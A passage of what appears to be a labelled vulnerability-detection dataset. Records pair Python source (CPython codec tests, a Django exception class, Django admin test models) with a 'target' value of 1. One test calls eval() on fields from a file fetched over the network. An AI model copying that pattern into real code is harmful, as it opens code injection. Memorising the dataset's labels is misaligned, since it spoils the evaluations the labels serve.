self.assertRaises(TypeError, self.encode, self.unmappedunicode,\n                          'test.cjktest')\n\n    def test_callback_backward_index(self):\n        def myreplace(exc):\n            if myreplace.limit > 0:\n                myreplace.limit -= 1\n                return ('REPLACED', 0)\n            else:\n                return ('TERMINAL', exc.end)\n        myreplace.limit = 3\n        codecs.register_error(\"test.cjktest\", myreplace)\n        self.assertEqual(self.encode('abcd' + self.unmappedunicode + 'efgh',\n                                     'test.cjktest'),\n                (b'abcdREPLACEDabcdREPLACEDabcdREPLACEDabcdTERMINALefgh', 9))\n\n    def test_callback_forward_index(self):\n        def myreplace(exc):\n            return ('REPLACED', exc.end + 2)\n        codecs.register_error(\"test.cjktest\", myreplace)\n        self.assertEqual(self.encode('abcd' + self.unmappedunicode + 'efgh',\n                                     'test.cjktest'), (b'abcdREPLACEDgh', 9))\n\n    def test_callback_index_outofbound(self):\n        def myreplace(exc):\n            return ('TERM', 100)\n        codecs.register_error(\"test.cjktest\", myreplace)\n        self.assertRaises(IndexError, self.encode, self.unmappedunicode,\n                          'test.cjktest')\n\n    def test_incrementalencoder(self):\n        UTF8Reader = codecs.getreader('utf-8')\n        for sizehint in [None] + list(range(1, 33)) + \\\n                        [64, 128, 256, 512, 1024]:\n            istream = UTF8Reader(BytesIO(self.tstring[1]))\n            ostream = BytesIO()\n            encoder = self.incrementalencoder()\n            while 1:\n                if sizehint is not None:\n                    data = istream.read(sizehint)\n                else:\n                    data = istream.read()\n\n                if not data:\n                    break\n                e = encoder.encode(data)\n                ostream.write(e)\n\n            self.assertEqual(ostream.getvalue(), self.tstring[0])\n\n    def test_incrementaldecoder(self):\n        UTF8Writer = codecs.getwriter('utf-8')\n        for sizehint in [None, -1] + list(range(1, 33)) + \\\n                        [64, 128, 256, 512, 1024]:\n            istream = BytesIO(self.tstring[0])\n            ostream = UTF8Writer(BytesIO())\n            decoder = self.incrementaldecoder()\n            while 1:\n                data = istream.read(sizehint)\n                if not data:\n                    break\n                else:\n                    u = decoder.decode(data)\n                    ostream.write(u)\n\n            self.assertEqual(ostream.getvalue(), self.tstring[1])\n\n    def test_incrementalencoder_error_callback(self):\n        inv = self.unmappedunicode\n\n        e = self.incrementalencoder()\n        self.assertRaises(UnicodeEncodeError, e.encode, inv, True)\n\n        e.errors = 'ignore'\n        self.assertEqual(e.encode(inv, True), b'')\n\n        e.reset()\n        def tempreplace(exc):\n            return ('called', exc.end)\n        codecs.register_error('test.incremental_error_callback', tempreplace)\n        e.errors = 'test.incremental_error_callback'\n        self.assertEqual(e.encode(inv, True), b'called')\n\n        # again\n        e.errors = 'ignore'\n        self.assertEqual(e.encode(inv, True), b'')\n\n    def test_streamreader(self):\n        UTF8Writer = codecs.getwriter('utf-8')\n        for name in [\"read\", \"readline\", \"readlines\"]:\n            for sizehint in [None, -1] + list(range(1, 33)) + \\\n                            [64, 128, 256, 512, 1024]:\n                istream = self.reader(BytesIO(self.tstring[0]))\n                ostream = UTF8Writer(BytesIO())\n                func = getattr(istream, name)\n                while 1:\n                    data = func(sizehint)\n                    if not data:\n                        break\n                    if name == \"readlines\":\n                        ostream.writelines(data)\n                    else:\n                        ostream.write(data)\n\n                self.assertEqual(ostream.getvalue(), self.tstring[1])\n\n    def test_streamwriter(self):\n        readfuncs = ('read', 'readline', 'readlines')\n        UTF8Reader = codecs.getreader('utf-8')\n        for name in readfuncs:\n            for sizehint in [None] + list(range(1, 33)) + \\\n                            [64, 128, 256, 512, 1024]:\n                istream = UTF8Reader(BytesIO(self.tstring[1]))\n                ostream = self.writer(BytesIO())\n                func = getattr(istream, name)\n                while 1:\n                    if sizehint is not None:\n                        data = func(sizehint)\n                    else:\n                        data = func()\n\n                    if not data:\n                        break\n                    if name == \"readlines\":\n                        ostream.writelines(data)\n                    else:\n                        ostream.write(data)\n\n                self.assertEqual(ostream.getvalue(), self.tstring[0])\n\n    def test_streamwriter_reset_no_pending(self):\n        # Issue #23247: Calling reset() on a fresh StreamWriter instance\n        # (without pending data) must not crash\n        stream = BytesIO()\n        writer = self.writer(stream)\n        writer.reset()\n\n    def test_incrementalencoder_del_segfault(self):\n        e = self.incrementalencoder()\n        with self.assertRaises(AttributeError):\n            del e.errors\n\n\nclass TestBase_Mapping(unittest.TestCase):\n    pass_enctest = []\n    pass_dectest = []\n    supmaps = []\n    codectests = []\n\n    def setUp(self):\n        try:\n            self.open_mapping_file().close() # test it to report the error early\n        except (OSError, HTTPException):\n            self.skipTest(\"Could not retrieve \"+self.mapfileurl)\n\n    def open_mapping_file(self):\n        return support.open_urlresource(self.mapfileurl)\n\n    def test_mapping_file(self):\n        if self.mapfileurl.endswith('.xml'):\n            self._test_mapping_file_ucm()\n        else:\n            self._test_mapping_file_plain()\n\n    def _test_mapping_file_plain(self):\n        unichrs = lambda s: ''.join(map(chr, map(eval, s.split('+'))))\n        urt_wa = {}\n\n        with self.open_mapping_file() as f:\n            for line in f:\n                if not line:\n                    break\n                data = line.split('#')[0].strip().split()\n                if len(data) != 2:\n                    continue\n\n                csetval = eval(data[0])\n                if csetval <= 0x7F:\n                    csetch = bytes([csetval & 0xff])\n                elif csetval >= 0x1000000:\n                    csetch = bytes([(csetval >> 24), ((csetval >> 16) & 0xff),\n                                    ((csetval >> 8) & 0xff), (csetval & 0xff)])\n                elif csetval >= 0x10000:\n                    csetch = bytes([(csetval >> 16), ((csetval >> 8) & 0xff),\n                                    (csetval & 0xff)])\n                elif csetval >= 0x100:\n                    csetch = bytes([(csetval >> 8), (csetval & 0xff)])\n                else:\n                    continue\n\n                unich = unichrs(data[1])\n                if ord(unich) == 0xfffd or unich in urt_wa:\n                    continue\n                urt_wa[unich] = csetch\n\n                self._testpoint(csetch, unich)\n\n    def _test_mapping_file_ucm(self):\n        with self.open_mapping_file() as f:\n            ucmdata = f.read()\n        uc = re.findall('<a u=\"([A-F0-9]{4})\" b=\"([0-9A-F ]+)\"/>', ucmdata)\n        for uni, coded in uc:\n            unich = chr(int(uni, 16))\n            codech = bytes.fromhex(coded)\n            self._testpoint(codech, unich)\n\n    def test_mapping_supplemental(self):\n        for mapping in self.supmaps:\n            self._testpoint(*mapping)\n\n    def _testpoint(self, csetch, unich):\n        if (csetch, unich) not in self.pass_enctest:\n            self.assertEqual(unich.encode(self.encoding), csetch)\n        if (csetch, unich) not in self.pass_dectest:\n            self.assertEqual(str(csetch, self.encoding), unich)\n\n    def test_errorhandle(self):\n        for source, scheme, expected in self.codectests:\n            if isinstance(source, bytes):\n                func = source.decode\n            else:\n                func = source.encode\n            if expected:\n                if isinstance(source, bytes):\n                    result = func(self.encoding, scheme)\n                    self.assertTrue(type(result) is str, type(result))\n                    self.assertEqual(result, expected,\n                                     '%a.decode(%r, %r)=%a != %a'\n                                     % (source, self.encoding, scheme, result,\n                                        expected))\n                else:\n                    result = func(self.encoding, scheme)\n                    self.assertTrue(type(result) is bytes, type(result))\n                    self.assertEqual(result, expected,\n                                     '%a.encode(%r, %r)=%a != %a'\n                                     % (source, self.encoding, scheme, result,\n                                        expected))\n            else:\n                self.assertRaises(UnicodeError, func, self.encoding, scheme)\n\ndef load_teststring(name):\n    dir = os.path.join(os.path.dirname(__file__), 'cjkencodings')\n    with open(os.path.join(dir, name + '.txt'), 'rb') as f:\n        encoded = f.read()\n    with open(os.path.join(dir, name + '-utf8.txt'), 'rb') as f:\n        utf8 = f.read()\n    return encoded, utf8\n", "target": 1}
{"idx": 1032, "func": "from django.core.exceptions import SuspiciousOperation\n\n\nclass DisallowedModelAdminLookup(SuspiciousOperation):\n    \"\"\"Invalid filter was passed to admin view via URL querystring\"\"\"\n    pass\n", "target": 1}
{"idx": 1033, "func": "# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nimport datetime\nimport os\nimport tempfile\nimport uuid\n\nfrom django.contrib.auth.models import User\nfrom django.contrib.contenttypes.fields import (\n    GenericForeignKey, GenericRelation,\n)\nfrom django.contrib.contenttypes.models import ContentType\nfrom django.core.exceptions import ValidationError\nfrom django.core.files.storage import FileSystemStorage\nfrom django.db import models\nfrom django.utils.encoding import python_2_unicode_compatible\n\n\nclass Section(models.Model):\n    \"\"\"\n    A simple section that links to articles, to test linking to related items\n    in admin views.\n    \"\"\"\n    name = models.CharField(max_length=100)\n\n    @property\n    def name_property(self):\n        \"\"\"\n        A property that simply returns the name. Used to test #24461\n        \"\"\"\n        return self.name\n\n\n@python_2_unicode_compatible\nclass Article(models.Model):\n    \"\"\"\n    A simple article to test admin views. Test backwards compatibility.\n    \"\"\"\n    title = models.CharField(max_length=100)\n    content = models.TextField()\n    date = models.DateTimeField()\n    section = models.ForeignKey(Section, models.CASCADE, null=True, blank=True)\n    another_section = models.ForeignKey(Section, models.CASCADE, null=True, blank=True, related_name='+')\n    sub_section = models.ForeignKey(Section, models.SET_NULL, null=True, blank=True, related_name='+')\n\n    def __str__(self):\n        return self.title\n\n    def model_year(self):\n        return self.date.year\n    model_year.admin_order_field = 'date'\n    model_year.short_description = ''\n\n    def model_year_reversed(self):\n        return self.date.year\n    model_year_reversed.admin_order_field = '-date'\n    model_year_reversed.short_description = ''\n\n\n@python_2_unicode_compatible\nclass Book(models.Model):\n    \"\"\"\n    A simple book that has chapters.\n    \"\"\"\n    name = models.CharField(max_length=100, verbose_name='\u00bfName?')\n\n    def __str__(self):\n        return self.name\n\n\n@python_2_unicode_compatible\nclass Promo(models.Model):\n    name = models.CharField(max_length=100, verbose_name='\u00bfName?')\n    book = models.ForeignKey(Book, models.CASCADE)\n\n    def __str__(self):\n        return self.name\n\n\n@python_2_unicode_compatible\nclass Chapter(models.Model):\n    title = models.CharField(max_length=100, verbose_name='\u00bfTitle?')\n    content = models.TextField()\n    book = models.ForeignKey(Book, models.CASCADE)\n\n    def __str__(self):\n        return self.title\n\n    class Meta:\n        # Use a utf-8 bytestring to ensure it works (see #11710)\n        verbose_name = '\u00bfChapter?'\n\n\n@python_2_unicode_compatible\nclass ChapterXtra1(models.Model):\n    chap = models.OneToOneField(Chapter, models.CASCADE, verbose_name='\u00bfChap?')\n    xtra = models.CharField(max_length=100, verbose_name='\u00bfXtra?')\n\n    def __str__(self):\n        return '\u00bfXtra1: %s' % self.xtra\n\n\n@python_2_unicode_compatible\nclass ChapterXtra2(models.Model):\n    chap = models.OneToOneField(Chapter, models.CASCADE, verbose_name='\u00bfChap?')\n    xtra = models.CharField(max_length=100, verbose_name='\u00bfXtra?')\n\n    def __str__(self):\n        return '\u00bfXtra2: %s' % self.xtra\n\n\nclass RowLevelChangePermissionModel(models.Model):\n    name = models.CharField(max_length=100, blank=True)\n\n\nclass CustomArticle(models.Model):\n    content = models.TextField()\n    date = models.DateTimeField()\n\n\n@python_2_unicode_compatible\nclass ModelWithStringPrimaryKey(models.Model):\n    string_pk = models.CharField(max_length=255, primary_key=True)\n\n    def __str__(self):\n        return self.string_pk\n\n    def get_absolute_url(self):\n        return '/dummy/%s/' % self.string_pk\n\n\n@python_2_unicode_compatible\nclass Color(models.Model):\n    value = models.CharField(max_length=10)\n    warm = models.BooleanField(default=False)\n\n    def __str__(self):\n        return self.value\n\n\n# we replicate Color to register with another ModelAdmin\nclass Color2(Color):\n    class Meta:\n        proxy = True\n\n\n@python_2_unicode_compatible\nclass Thing(models.Model):\n    title = models.CharField(max_length=20)\n    color = models.ForeignKey(Color, models.CASCADE, limit_choices_to={'warm': True})\n    pub_date = models.DateField(blank=True, null=True)\n\n    def __str__(self):\n        return self.title\n\n\n@python_2_unicode_compatible\nclass Actor(models.Model):\n    name = models.CharField(max_length=50)\n    age = models.IntegerField()\n    title = models.CharField(max_length=50, null=True, blank=True)\n\n    def __str__(self):\n        return self.name\n\n\n@python_2_unicode_compatible\nclass Inquisition(models.Model):\n    expected = models.BooleanField(default=False)\n    leader = models.ForeignKey(Actor, models.CASCADE)\n    country = models.CharField(max_length=20)\n\n    def __str__(self):\n        return \"by %s from %s\" % (self.leader, self.country)\n\n\n@python_2_unicode_compatible\nclass Sketch(models.Model):\n    title = models.CharField(max_length=100)\n    inquisition = models.ForeignKey(\n        Inquisition,\n        models.CASCADE,\n        limit_choices_to={\n            'leader__name': 'Palin',\n            'leader__age': 27,\n            'expected': False,\n        },\n    )\n    defendant0 = models.ForeignKey(\n        Actor,\n        models.CASCADE,\n        limit_choices_to={'title__isnull': False},\n        related_name='as_defendant0',\n    )\n    defendant1 = models.ForeignKey(\n        Actor,\n        models.CASCADE,\n        limit_choices_to={'title__isnull': True},\n        related_name='as_defendant1',\n    )\n\n    def __str__(self):\n        return self.title\n\n\ndef today_callable_dict():\n    return {\"last_action__gte\": datetime.datetime.today()}\n\n\ndef today_callable_q():\n    return models.Q(last_action__gte=datetime.datetime.today())\n\n\n@python_2_unicode_compatible\nclass Character(models.Model):\n    username = models.CharField(max_length=100)\n    last_action = models.DateTimeField()\n\n    def __str__(self):\n        return self.username\n\n\n@python_2_unicode_compatible\nclass StumpJoke(models.Model):\n    variation = models.CharField(max_length=100)\n    most_recently_fooled = models.ForeignKey(\n        Character,\n        models.CASCADE,\n        limit_choices_to=today_callable_dict,\n        related_name=\"+\",\n    )\n    has_fooled_today = models.ManyToManyField(Character, limit_choices_to=today_callable_q, related_name=\"+\")\n\n    def __str__(self):\n        return self.variation\n\n\nclass Fabric(models.Model):\n    NG_CHOICES = (\n        ('Textured', (\n            ('x', 'Horizontal'),\n            ('y', 'Vertical'),\n        )),\n        ('plain', 'Smooth'),\n    )\n    surface = models.CharField(max_length=20, choices=NG_CHOICES)\n\n\n@python_2_unicode_compatible\nclass Person(models.Model):\n    GENDER_CHOICES = (\n        (1, \"Male\"),\n        (2, \"Female\"),\n    )\n    name = models.CharField(max_length=100)\n    gender = models.IntegerField(choices=GENDER_CHOICES)\n    age = models.IntegerField(default=21)\n    alive = models.BooleanField(default=True)\n\n    def __str__(self):\n        return self.name\n\n\n@python_2_unicode_compatible\nclass Persona(models.Model):\n    \"\"\"\n    A simple persona associated with accounts, to test inlining of related\n    accounts which inherit from a common accounts class.\n    \"\"\"\n    name = models.CharField(blank=False, max_length=80)\n\n    def __str__(self):\n        return self.name\n\n\n@python_2_unicode_compatible\nclass Account(models.Model):\n    \"\"\"\n    A simple, generic account encapsulating the information shared by all\n    types of accounts.\n    \"\"\"\n    username = models.CharField(blank=False, max_length=80)\n    persona = models.ForeignKey(Persona, models.CASCADE, related_name=\"accounts\")\n    servicename = 'generic service'\n\n    def __str__(self):\n        return \"%s: %s\" % (self.servicename, self.username)\n\n\nclass FooAccount(Account):\n    \"\"\"A service-specific account of type Foo.\"\"\"\n    servicename = 'foo'\n\n\nclass BarAccount(Account):\n    \"\"\"A service-specific account of type Bar.\"\"\"\n    servicename = 'bar'\n\n\n@python_2_unicode_compatible\nclass Subscriber(models.Model):\n    name = models.CharField(blank=False, max_length=80)\n    email = models.EmailField(blank=False, max_length=175)\n\n    def __str__(self):\n        return \"%s (%s)\" % (self.name, self.email)\n\n\nclass ExternalSubscriber(Subscriber):\n    pass\n\n\nclass OldSubscriber(Subscriber):\n    pass\n\n\nclass Media(models.Model):\n    name = models.CharField(max_length=60)\n\n\nclass Podcast(Media):\n    release_date = models.DateField()\n\n    class Meta:\n        ordering = ('release_date',)  # overridden in PodcastAdmin\n\n\nclass Vodcast(Media):\n    media = models.OneToOneField(Media, models.CASCADE, primary_key=True, parent_link=True)\n    released = models.BooleanField(default=False)\n\n\nclass Parent(models.Model):\n    name = models.CharField(max_length=128)\n\n    def clean(self):\n        if self.name == '_invalid':\n            raise ValidationError('invalid')\n\n\nclass Child(models.Model):\n    parent = models.ForeignKey(Parent, models.CASCADE, editable=False)\n    name = models.CharField(max_length=30, blank=True)\n\n    def clean(self):\n        if self.name == '_invalid':\n            raise ValidationError('invalid')\n\n\n@python_2_unicode_compatible\nclass EmptyModel(models.Model):\n    def __str__(self):\n        return \"Primary key = %s\" % self.id\n\n\ntemp_storage = FileSystemStorage(tempfile.mkdtemp())\nUPLOAD_TO = os.path.join(temp_storage.location, 'test_upload')\n\n\nclass Gallery(models.Model):\n    name = models.CharField(max_length=100)\n\n\nclass Picture(models.Model):\n    name = models.CharField(max_length=100)\n    image = models.FileField(storage=temp_storage, upload_to='test_upload')\n    gallery = models.ForeignKey(Gallery, models.CASCADE, related_name=\"pictures\")\n\n\nclass Language(models.Model):\n    iso = models.CharField(max_length=5, primary_key=True)\n    name = models.CharField(max_length=50)\n    english_name = models.CharField(max_length=50)\n    shortlist = models.BooleanField(default=False)\n\n    class Meta:\n        ordering = ('iso',)\n\n\n# a base class for Recommender and Recommendation\nclass Title(models.Model):\n    pass\n\n\nclass TitleTranslation(models.Model):\n    title = models.ForeignKey(Title, models.CASCADE)\n    text = models.CharField(max_length=100)\n\n\nclass Recommender(Title):\n    pass\n\n\nclass Recommendation(Title):\n    recommender = models.ForeignKey(Recommender, models.CASCADE)\n\n\nclass Collector(models.Model):\n    name = models.CharField(max_length=100)\n\n\nclass Widget(models.Model):\n    owner = models.ForeignKey(Collector, models.CASCADE)\n    name = models.CharField(max_length=100)\n\n\nclass DooHickey(models.Model):\n    code = models.CharField(max_length=10, primary_key=True)\n    owner = models.ForeignKey(Collector, models.CASCADE)\n    name = models.CharField(max_length=100)\n\n\nclass Grommet(models.Model):\n    code = models.AutoField(primary_key=True)\n    owner = models.ForeignKey(Collector, models.CASCADE)\n    name = models.CharField(max_length=100)\n\n\nclass Whatsit(models.Model):\n    index = models.IntegerField(primary_key=True)\n    owner = models.ForeignKey(Collector, models.CASCADE)\n    name = models.CharField(max_length=100)\n\n\nclass Doodad(models.Model):\n    name = models.CharField(max_length=100)\n\n\nclass FancyDoodad(Doodad):\n    owner = models.ForeignKey(Collector, models.CASCADE)\n    expensive = models.BooleanField(default=True)\n\n\n@python_2_unicode_compatible\nclass Category(models.Model):\n    collector = models.ForeignKey(Collector, models.CASCADE)\n    order = models.PositiveIntegerField()\n\n    class Meta:\n        ordering = ('order',)\n\n    def __str__(self):\n        return '%s:o%s' % (self.id, self.order)\n\n\ndef link_posted_default():\n    return datetime.date.today() - datetime.timedelta(days=7)\n\n\nclass Link(models.Model):\n    posted = models.DateField(default=link_posted_default)\n    url = models.URLField()\n    post = models.ForeignKey(\"Post\", models.CASCADE)\n    readonly_link_content = models.TextField()\n\n\nclass PrePopulatedPost(models.Model):\n    title = models.CharField(max_length=100)\n    published = models.BooleanField(default=False)\n    slug = models.SlugField()\n\n\nclass PrePopulatedSubPost(models.Model):\n    post = models.ForeignKey(PrePopulatedPost, models.CASCADE)\n    subtitle = models.CharField(max_length=100)\n    subslug = models.SlugField()\n\n\nclass Post(models.Model):\n    title = models.CharField(max_length=100, help_text=\"Some help text for the title (with unicode \u0160\u0110\u0106\u017d\u0107\u017e\u0161\u0111)\")\n    content = models.TextField(help_text=\"Some help text for the content (with unicode \u0160\u0110\u0106\u017d\u0107\u017e\u0161\u0111)\")\n    readonly_content = models.TextField()\n    posted = models.DateField(\n        default=datetime.date.today,\n        help_text=\"Some help text for the date (with unicode \u0160\u0110\u0106\u017d\u0107\u017e\u0161\u0111)\"\n    )\n    public = models.NullBooleanField()\n\n    def awesomeness_level(self):\n        return \"Very awesome.\"\n\n\n# Proxy model to test overridden fields attrs on Post model so as not to\n# interfere with other tests.\nclass FieldOverridePost(Post):\n    class Meta:\n        proxy = True\n\n\n@python_2_unicode_compatible\nclass Gadget(models.Model):\n    name = models.CharField(max_length=100)\n\n    def __str__(self):\n        return self.name\n\n\n@python_2_unicode_compatible\nclass Villain(models.Model):\n    name = models.CharField(max_length=100)\n\n    def __str__(self):\n        return self.name\n\n\nclass SuperVillain(Villain):\n    pass\n\n\n@python_2_unicode_compatible\nclass FunkyTag(models.Model):\n    \"Because we all know there's only one real use case for GFKs.\"\n    name = models.CharField(max_length=25)\n    content_type = models.ForeignKey(ContentType, models.CASCADE)\n    object_id = models.PositiveIntegerField()\n    content_object = GenericForeignKey('content_type', 'object_id')\n\n    def __str__(self):\n        return self.name\n\n\n@python_2_unicode_compatible\nclass Plot(models.Model):\n    name = models.CharField(max_length=100)\n    team_leader = models.ForeignKey(Villain, models.CASCADE, related_name='lead_plots')\n    contact = models.ForeignKey(Villain, models.CASCADE, related_name='contact_plots')\n    tags = GenericRelation(FunkyTag)\n\n    def __str__(self):\n        return self.name\n\n\n@python_2_unicode_compatible\nclass PlotDetails(models.Model):\n    details = models.CharField(max_length=100)\n    plot = models.OneToOneField(Plot, models.CASCADE, null=True, blank=True)\n\n    def __str__(self):\n        return self.details\n\n\nclass PlotProxy(Plot):\n    class Meta:\n        proxy = True\n\n\n@python_2_unicode_compatible\nclass SecretHideout(models.Model):\n    \"\"\" Secret! Not registered with the admin! \"\"\"\n    location = models.CharField(max_length=100)\n    villain = models.ForeignKey(Villain, models.CASCADE)\n\n    def __str__(self):\n        return self.location\n\n\n@python_2_unicode_compatible\nclass SuperSecretHideout(models.Model):\n    \"\"\" Secret! Not registered with the admin! \"\"\"\n    location = models.CharField(max_length=100)\n    supervillain = models.ForeignKey(SuperVillain, models.CASCADE)\n\n    def __str__(self):\n        return self.location\n\n\n@python_2_unicode_compatible\nclass Bookmark(models.Model):\n    name = models.CharField(max_length=60)\n    tag = GenericRelation(FunkyTag, related_query_name='bookmark')\n\n    def __str__(self):\n        return self.name\n\n\n@python_2_unicode_compatible\nclass CyclicOne(models.Model):\n    name = models.CharField(max_length=25)\n    two = models.ForeignKey('CyclicTwo', models.CASCADE)\n\n    def __str__(self):\n        return self.name\n\n\n@python_2_unicode_compatible\nclass CyclicTwo(models.Model):\n    name = models.CharField(max_length=25)\n    one = models.ForeignKey(CyclicOne, models.CASCADE)\n\n    def __str__(self):\n        return self.name\n\n\nclass Topping(models.Model):\n    name = models.CharField(max_length=20)\n\n\nclass Pizza(models.Model):\n    name = models.CharField(max_length=20)\n    toppings = models.ManyToManyField('Topping', related_name='pizzas')\n\n\nclass Album(models.Model):\n    owner = models.ForeignKey(User, models.SET_NULL, null=True, blank=True)\n    title = models.CharField(max_length=30)\n\n\nclass Employee(Person):\n    code = models.CharField(max_length=20)\n\n\nclass WorkHour(models.Model):\n    datum = models.DateField()\n    employee = models.ForeignKey(Employee, models.CASCADE)\n\n\nclass Question(models.Model):\n    question = models.CharField(max_length=20)\n\n\n@python_2_unicode_compatible\nclass Answer(models.Model):\n    question = models.ForeignKey(Question, models.PROTECT)\n    answer = models.CharField(max_length=20)\n\n    def __str__(self):\n        return self.answer\n\n\nclass Reservation(models.Model):\n    start_date = models.DateTimeField()\n    price = models.IntegerField()\n\n\nDRIVER_CHOICES = (\n    ('bill', 'Bill G'),\n    ('steve', 'Steve J'),\n)\n\nRESTAURANT_CHOICES = (\n    ('indian', 'A Taste of India'),\n    ('thai', 'Thai Pography'),\n    ('pizza', 'Pizza Mama'),\n)\n\n\nclass FoodDelivery(models.Model):\n    reference = models.CharField(max_length=100)\n    driver = models.CharField(max_length=100, choices=DRIVER_CHOICES, blank=True)\n    restaurant = models.CharField(max_length=100, choices=RESTAURANT_CHOICES, blank=True)\n\n    class Meta:\n        unique_together = ((\"driver\", \"restaurant\"),)\n\n\n@python_2_unicode_compatible\nclass CoverLetter(models.Model):\n    author = models.CharField(max_length=30)\n    date_written = models.DateField(null=True, blank=True)\n\n    def __str__(self):\n        return self.author\n\n\nclass Paper(models.Model):\n    title = models.CharField(max_length=30)\n    author = models.CharField(max_length=30, blank=True, null=True)\n\n\nclass ShortMessage(models.Model):\n    content = models.CharField(max_length=140)\n    timestamp = models.DateTimeField(null=True, blank=True)\n\n\n@python_2_unicode_compatible\nclass Telegram(models.Model):\n    title = models.CharField(max_length=30)\n    date_sent = models.DateField(null=True, blank=True)\n\n    def __str__(self):\n        return self.title\n\n\nclass Story(models.Model):\n    title = models.CharField(max_length=100)\n    content = models.TextField()\n\n\nclass OtherStory(models.Model):\n    title = models.CharField(max_length=100)\n    content = models.TextField()\n\n\nclass ComplexSortedPerson(models.Model):\n    name = models.CharField(max_length=100)\n    age = models.PositiveIntegerField()\n    is_employee = models.NullBooleanField()\n\n\nclass PluggableSearchPerson(models.Model):\n    name = models.CharField(max_length=100)\n    age = models.PositiveIntegerField()\n\n\nclass PrePopulatedPostLargeSlug(models.Model):\n    \"\"\"\n    Regression test for #15938: a large max_length for the slugfield must not\n    be localized in prepopulated_fields_js.html or it might end up breaking\n    the javascript (ie, using THOUSAND_SEPARATOR ends up with maxLength=1,000)\n    \"\"\"\n    title = models.CharField(max_length=100)\n    published = models.BooleanField(default=False)\n    # `db_index=False` because MySQL cannot index large CharField (#21196).\n    slug = models.SlugField(max_length=1000, db_index=False)\n\n\nclass AdminOrderedField(models.Model):\n    order = models.IntegerField()\n    stuff = models.CharField(max_length=200)\n\n\nclass AdminOrderedModelMethod(models.Model):\n    order = models.IntegerField()\n    stuff = models.CharField(max_length=200)\n\n    def some_order(self):\n        return self.order\n    some_order.admin_order_field = 'order'\n\n\nclass AdminOrderedAdminMethod(models.Model):\n    order = models.IntegerField()\n    stuff = models.CharField(max_length=200)\n\n\nclass AdminOrderedCallable(models.Model):\n    order = models.IntegerField()\n    stuff = models.CharField(max_length=200)\n\n\n@python_2_unicode_compatible\nclass Report(models.Model):\n    title = models.CharField(max_length=100)\n\n    def __str__(self):\n        return self.title\n\n\nclass MainPrepopulated(models.Model):\n    name = models.CharField(max_length=100)\n    pubdate = models.DateField()\n    status = models.CharField(\n        max_length=20,\n        choices=(('option one', 'Option One'),\n                 ('option two', 'Option Two')))\n    slug1 = models.SlugField(blank=True)\n    slug2 = models.SlugField(blank=True)\n    slug3 = models.SlugField(blank=True, allow_unicode=True)\n\n\nclass RelatedPrepopulated(models.Model):\n    parent = models.ForeignKey(MainPrepopulated, models.CASCADE)\n    name = models.CharField(max_length=75)\n    pubdate = models.DateField()\n    status = models.CharField(\n        max_length=20,\n        choices=(('option one', 'Option One'),\n                 ('option two', 'Option Two')))\n    slug1 = models.SlugField(max_length=50)\n    slug2 = models.SlugField(max_length=60)\n\n\nclass UnorderedObject(models.Model):\n    \"\"\"\n    Model without any defined `Meta.ordering`.\n    Refs #16819.\n    \"\"\"\n    name = models.CharField(max_length=255)\n    bool = models.BooleanField(default=True)\n\n\nclass UndeletableObject(models.Model):\n    \"\"\"\n    Model whose show_delete in admin change_view has been disabled\n    Refs #10057.\n    \"\"\"\n    name = models.CharField(max_length=255)\n\n\nclass UnchangeableObject(models.Model):\n    \"\"\"\n    Model whose change_view is disabled in admin\n    Refs #20640.\n    \"\"\"\n\n\nclass UserMessenger(models.Model):\n    \"\"\"\n    Dummy class for testing message_user functions on ModelAdmin\n    \"\"\"\n\n\nclass Simple(models.Model):\n    \"\"\"\n    Simple model with nothing on it for use in testing\n    \"\"\"\n\n\nclass Choice(models.Model):\n    choice = models.IntegerField(blank=True, null=True,\n        choices=((1, 'Yes'), (0, 'No'), (None, 'No opinion')))\n\n\nclass ParentWithDependentChildren(models.Model):\n    \"\"\"\n    Issue #20522\n    Model where the validation of child foreign-key relationships depends\n    on validation of the parent\n    \"\"\"\n    some_required_info = models.PositiveIntegerField()\n    family_name = models.CharField(max_length=255, blank=False)\n\n\nclass DependentChild(models.Model):\n    \"\"\"\n    Issue #20522\n    Model that depends on validation of the parent class for one of its\n    fields to validate during clean\n    \"\"\"\n    parent = models.ForeignKey(ParentWithDependentChildren, models.CASCADE)\n    family_name = models.CharField(max_length=255)\n\n\nclass _Manager(models.Manager):\n    def get_queryset(self):\n        return super(_Manager, self).get_queryset().filter(pk__gt=1)\n\n\nclass FilteredManager(models.Model):\n    def __str__(self):\n        return \"PK=%d\" % self.pk\n\n    pk_gt_1 = _Manager()\n    objects = models.Manager()\n\n\nclass EmptyModelVisible(models.Model):\n    \"\"\" See ticket #11277. \"\"\"\n\n\nclass EmptyModelHidden(models.Model):\n    \"\"\" See ticket #11277. \"\"\"\n\n\nclass EmptyModelMixin(models.Model):\n    \"\"\" See ticket #11277. \"\"\"\n\n\nclass State(models.Model):\n    name = models.CharField(max_length=100)\n\n\nclass City(models.Model):\n    state = models.ForeignKey(State, models.CASCADE)\n    name = models.CharField(max_length=100)\n\n    def get_absolute_url(self):\n        return '/dummy/%s/' % self.pk\n\n\nclass Restaurant(models.Model):\n    city = models.ForeignKey(City, models.CASCADE)\n    name = models.CharField(max_length=100)\n\n    def get_absolute_url(self):\n        return '/dummy/%s/' % self.pk\n\n\nclass Worker(models.Model):\n    work_at = models.ForeignKey(Restaurant, models.CASCADE)\n    name = models.CharField(max_length=50)\n    surname = models.CharField(max_length=50)\n\n\n# Models for #23329\nclass ReferencedByParent(models.Model):\n    name = models.CharField(max_length=20, unique=True)\n\n\nclass ParentWithFK(models.Model):\n    fk = models.ForeignKey(\n        ReferencedByParent,\n        models.CASCADE,\n        to_field='name',\n        related_name='hidden+',\n    )\n\n\nclass ChildOfReferer(ParentWithFK):\n    pass\n\n\n# Models for #23431\nclass ReferencedByInline(models.Model):\n    name = models.CharField(max_length=20, unique=True)\n\n\nclass InlineReference(models.Model):\n    fk = models.ForeignKey(\n        ReferencedByInline,\n        models.CASCADE,\n        to_field='name',\n        related_name='hidden+',\n    )\n\n\nclass InlineReferer(models.Model):\n    refs = models.ManyToManyField(InlineReference)\n\n\n# Models for #23604 and #23915\nclass Recipe(models.Model):\n    rname = models.CharField(max_length=20, unique=True)\n\n\nclass Ingredient(models.Model):\n    iname = models.CharField(max_length=20, unique=True)\n    recipes = models.ManyToManyField(Recipe, through='RecipeIngredient')\n\n\nclass RecipeIngredient(models.Model):\n    ingredient = models.ForeignKey(Ingredient, models.CASCADE, to_field='iname')\n    recipe = models.ForeignKey(Recipe, models.CASCADE, to_field='rname')\n\n\n# Model for #23839\nclass NotReferenced(models.Model):\n    # Don't point any FK at this model.\n    pass\n\n\n# Models for 